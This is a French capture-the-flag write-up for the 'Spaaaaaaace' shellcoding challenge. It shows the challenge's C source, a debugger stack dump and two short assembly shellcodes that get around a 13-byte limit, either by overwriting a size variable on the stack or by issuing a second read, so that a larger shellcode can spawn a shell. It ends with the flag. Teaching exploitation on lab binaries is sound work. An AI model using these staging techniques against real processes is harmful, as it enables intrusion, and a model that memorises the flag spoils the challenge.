# Writeup pour `Spaaaaaaace`

Auteur : *Pwnsard*  
Difficulté : *Facile*

### Notions prérequises :
- Fonctionnement d'une stackframe
- Shellcoding/Assembleur/Syscalls

### Principe

Il s'agit d'un challenge de shellcoding, avec pour contrainte principale qu'un payload ne peut avoir qu'une taille d'au plus `0xd` bytes.  

Une fonction permet de stocker un shellcode de taille au plus `firmware_max_size` :
```C
void upload_update(long firmware_max_size, void* firmware) {
   ssize_t bytes_read;
   printf("Ready to receive update > ");
   bytes_read = read(0, firmware, firmware_max_size);
}
```

Une fonction permet d'executer le shellcode stocké :
```C
void apply_update(void* firmware) {
   ((void (*)())firmware)();
}
```

Les variables étant définies dans le main comme suit :
```C
int main(void) {
   setvbuf(stdin, NULL, _IONBF, 0);
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);

   long firmware_max_size = 0xd;
   void *firmware;
   firmware = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
   
   intro();
   int res;

   while (true) {
      choice(&res);
      if (res == 1) {
         upload_update(firmware_max_size, firmware);
      } else if (res == 2) {
         apply_update(firmware);
      } else if (res == 3) {
         bidirectional_connection();
      } else {
         printf("Invalid choice");
      }
   }

   return 0;
}
```

Il s'agit donc de réussir à envoyer/éxecuter un shellcode de plus de `0xd` bytes à partir d'un plus petit shellcode.

### Solution prévue

Une première faille exploitable réside dans la définition de `firmware_max_size` dans main, et donc sa valeur stockée sur la stack.  

Lorsque l'on met un breakpoint au début de l'exécution du shellcode, on a une stack définie comme suit.

```
gef➤  x/14gx $sp
0x7fffffffd958:	0x000055555555539d	0x00007fffffffd970
0x7fffffffd968:	0x00007ffff7fbd000	0x00007fffffffd9a0
0x7fffffffd978:	0x0000555555555497	0x0000000000000000
0x7fffffffd988:	0x00000002f7fe4410	0x00007ffff7fbd000
0x7fffffffd998:	0x000000000000000d	0x00007fffffffda40
0x7fffffffd9a8:	0x00007ffff7db3248	0x00007fffffffd9f0
0x7fffffffd9b8:	0x00007fffffffdac8	0x0000000155554040
```

On repère le qword `0x000000000000000d`, à l'offset `0x7fffffffd998 - 0x7fffffffd958 = 0x40` de la stack

Ainsi en utilisant le shellcode suivant (de longueur 13 octets) : 
```assembly
mov rax, 800
mov [rsp + 0x40], rax
ret
```
On change la valeur de `firmware_max_size` à 800, et ainsi nous permet d'envoyer un shellcode beaucoup plus grand  pour éxecuter `/bin/sh` et de récupérer le flag.

### Deuxième solution possible  

Une autre solution trouvée pendant les tests est d'utiliser le shellcode 

```asm
read(0, mmaped_addr, 0x80)

xor rdi,rdi
mov rsi,rdx
mov edx, 0x80
syscall
```
qui permet de faire immédiatement un deuxième read de 0x80 octets. En envoyant ensuite un shellcode plus grand (commençant par un certain nombre de `nop` pour réécrire la partie contenant le premier shellcode), on obtient également un shell.

### Script de résolution :

Voir `solve.py`

### Flag : 

`404{wh3n_l1fe_91ve5_you_LeMOn...}`